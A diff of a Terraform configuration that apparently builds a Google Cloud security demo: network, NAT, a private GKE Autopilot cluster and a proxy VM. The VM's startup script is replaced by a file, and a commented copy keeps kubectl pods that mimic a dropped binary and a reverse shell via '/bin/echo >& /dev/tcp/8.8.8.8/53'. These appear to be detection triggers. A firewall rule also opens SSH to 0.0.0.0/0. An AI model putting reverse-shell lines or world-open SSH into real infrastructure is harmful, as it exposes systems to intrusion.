@@ -19,6 +19,7 @@
 ##  This is not built for production workload ##
 
 
+
 /*
 
 data "google_project" "appmod_project" {
@@ -28,11 +29,11 @@ data "google_project" "appmod_project" {
 
 */
 locals {
-   #GKE-Cluster locals
+  #GKE-Cluster locals
   memorystore_apis = ["redis.googleapis.com"]
   cluster_id_parts = split("/", google_container_cluster.my_cluster.id)
-  cluster_name = element(local.cluster_id_parts, length(local.cluster_id_parts) - 1)
-   
+  cluster_name     = element(local.cluster_id_parts, length(local.cluster_id_parts) - 1)
+
 }
 
 /*
@@ -108,19 +109,19 @@ resource "google_compute_network" "cloud_gke_network" {
   project                 = google_project.demo_project.project_id
   name                    = "gke-network"
   auto_create_subnetworks = false
-   depends_on = [
+  depends_on = [
     time_sleep.wait_enable_service_api,
-    ]
-  }
+  ]
+}
 
 # Creating GKE sub network
 resource "google_compute_subnetwork" "cloud_gke_subnetwork" {
-  name          = "cloud-gke-${var.network_region}"
-  ip_cidr_range = "192.168.10.0/24"
-  region        = var.network_region
-  project = google_project.demo_project.project_id
-  network       = google_compute_network.cloud_gke_network.self_link
-  private_ip_google_access   = true 
+  name                     = "cloud-gke-${var.network_region}"
+  ip_cidr_range            = "192.168.10.0/24"
+  region                   = var.network_region
+  project                  = google_project.demo_project.project_id
+  network                  = google_compute_network.cloud_gke_network.self_link
+  private_ip_google_access = true
   depends_on = [
     google_compute_network.cloud_gke_network,
   ]
@@ -139,10 +140,10 @@ resource "google_compute_router" "gke_router" {
     asn = 64514
   }
 }
- 
+
 # Configure a CloudNAT
 resource "google_compute_router_nat" "gke_nats" {
-  project = google_project.demo_project.project_id
+  project                            = google_project.demo_project.project_id
   name                               = "nat-cloud-sql-${var.vpc_network_name}"
   router                             = google_compute_router.gke_router.name
   region                             = google_compute_router.gke_router.region
@@ -158,23 +159,23 @@ resource "google_compute_router_nat" "gke_nats" {
 
 
 resource "google_compute_firewall" "allow_http_icmp" {
-name = "allow-http-icmp"
-network = google_compute_network.cloud_gke_network.self_link
-project = google_project.demo_project.project_id
-direction = "INGRESS"
-allow {
+  name      = "allow-http-icmp"
+  network   = google_compute_network.cloud_gke_network.self_link
+  project   = google_project.demo_project.project_id
+  direction = "INGRESS"
+  allow {
     protocol = "tcp"
     ports    = ["22"]
-    }
- source_ranges = ["0.0.0.0/0"]
+  }
+  source_ranges = ["0.0.0.0/0"]
 
-allow {
+  allow {
     protocol = "icmp"
-    }
-    depends_on = [
-        google_compute_network.cloud_gke_network
-    ]
-} 
+  }
+  depends_on = [
+    google_compute_network.cloud_gke_network
+  ]
+}
 
 
 
@@ -186,105 +187,113 @@ resource "google_container_cluster" "my_cluster" {
   project  = google_project.demo_project.project_id
   # Enabling autopilot for this cluster
   enable_autopilot = true
-#  binary_authorization {
-#  evaluation_mode = "PROJECT_SINGLETON_POLICY_ENFORCE"
-#  }
-  network       = google_compute_network.cloud_gke_network.self_link
+  #  binary_authorization {
+  #  evaluation_mode = "PROJECT_SINGLETON_POLICY_ENFORCE"
+  #  }
+  network    = google_compute_network.cloud_gke_network.self_link
   subnetwork = google_compute_subnetwork.cloud_gke_subnetwork.self_link
   # Setting an empty ip_allocation_policy to allow autopilot cluster to spin up correctly
-  
-    ip_allocation_policy {
-    cluster_ipv4_cidr_block       = "10.4.0.0/14"
-    services_ipv4_cidr_block      = "10.8.0.0/20"
-   }
 
-  
-    private_cluster_config {
+  ip_allocation_policy {
+    cluster_ipv4_cidr_block  = "10.4.0.0/14"
+    services_ipv4_cidr_block = "10.8.0.0/20"
+  }
+
+
+  private_cluster_config {
     enable_private_nodes    = true
     enable_private_endpoint = true
-    }
+  }
 
-     master_authorized_networks_config {
-        cidr_blocks {
-        cidr_block   = "192.168.10.0/24"
-        display_name = "internal"
-      }
-}  
+  master_authorized_networks_config {
+    cidr_blocks {
+      cidr_block   = "192.168.10.0/24"
+      display_name = "internal"
+    }
+  }
 
   depends_on = [
-#    google_binary_authorization_policy.this,
-#    google_project_organization_policy.external_ip_access,
-    ]
+    #    google_binary_authorization_policy.this,
+    #    google_project_organization_policy.external_ip_access,
+  ]
 }
 
 
 #Create the service Account
 resource "google_service_account" "k8_ser_acc" {
-   project = google_project.demo_project.project_id
-   account_id   = "k8-service-account"
-   display_name = "Kubernetes Proxy Service Account"
-   depends_on = [
+  project      = google_project.demo_project.project_id
+  account_id   = "k8-service-account"
+  display_name = "Kubernetes Proxy Service Account"
+  depends_on = [
     time_sleep.wait_enable_service_api,
-    ]
- }
+  ]
+}
 
 
 resource "google_organization_iam_member" "k8_container_dev" {
-    org_id  = var.organization_id
-    role    = "roles/container.developer"
-    member  = "serviceAccount:${google_service_account.k8_ser_acc.email}"
-    depends_on = [
-        google_service_account.k8_ser_acc,
-        ]
-    }
+  org_id = var.organization_id
+  role   = "roles/container.developer"
+  member = "serviceAccount:${google_service_account.k8_ser_acc.email}"
+  depends_on = [
+    google_service_account.k8_ser_acc,
+  ]
+}
 
 
 
 # Create Compute Instance (debian)
-resource "google_compute_instance" "kubernetes_proxy_server1" {
-    project      = google_project.demo_project.project_id
-    name         = "kubernetes-proxy-server1"
-    machine_type = "n2-standard-4"
-    zone         = var.network_zone
+resource "google_compute_instance" "kubernetes_proxy_server" {
+  project      = google_project.demo_project.project_id
+  name         = "kubernetes-proxy-server"
+  machine_type = "n2-standard-4"
+  zone         = var.network_zone
 
-    shielded_instance_config {
-        enable_integrity_monitoring = true
-        enable_secure_boot          = true
-        enable_vtpm                 = true
-    }
+  shielded_instance_config {
+    enable_integrity_monitoring = true
+    enable_secure_boot          = true
+    enable_vtpm                 = true
+  }
 
   depends_on = [
     time_sleep.wait_enable_service_api,
-#    google_organization_iam_member.k8_proj_owner,
+    #    google_organization_iam_member.k8_proj_owner,
     google_service_account.k8_ser_acc,
     google_container_cluster.my_cluster,
     google_compute_router_nat.gke_nats,
-    ]
+  ]
 
   boot_disk {
     initialize_params {
       image = "debian-cloud/debian-10"
     }
- }
+  }
 
   network_interface {
-  network       = google_compute_network.cloud_gke_network.self_link
-  subnetwork = google_compute_subnetwork.cloud_gke_subnetwork.self_link
-   
+    network    = google_compute_network.cloud_gke_network.self_link
+    subnetwork = google_compute_subnetwork.cloud_gke_subnetwork.self_link
+
   }
 
   service_account {
     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
-    email                       = google_service_account.k8_ser_acc.email
-    scopes                      = ["cloud-platform"]
+    email  = google_service_account.k8_ser_acc.email
+    scopes = ["cloud-platform"]
   }
-    metadata_startup_script     = "sudo apt-get update -y;sudo apt-get install git -y;sudo apt-get install kubectl;sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin;git clone https://github.com/mgaur10/security-foundation-solution.git;sudo gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result};sudo kubectl apply -f /security-foundation-solution/release/kubernetes-manifests.yaml;sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)';sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
-    
+  #   metadata_startup_script     = "sudo apt-get update -y;sudo apt-get install git -y;sudo apt-get install kubectl;sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin;git clone https://github.com/mgaur10/security-foundation-solution.git;sudo gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result};sudo kubectl apply -f /security-foundation-solution/release/kubernetes-manifests.yaml;sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)';sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
 
-    labels =   {
-        asset_type = "prod"
-        osshortname = "debian"  
-        }
+
+  metadata_startup_script = file("${path.module}/script/startup-ctd.sh")
+  metadata = {
+    #  TARGET_IP = "${google_compute_instance.ids_victim_server.network_interface.0.network_ip}"
+    CLUSTER_NAME = "${local.cluster_name}"
+    PROJ_ID      = "${var.demo_project_id}${random_string.id.result}"
+  }
+
+
+  labels = {
+    asset_type  = "prod"
+    osshortname = "debian"
+  }
 }
 
 
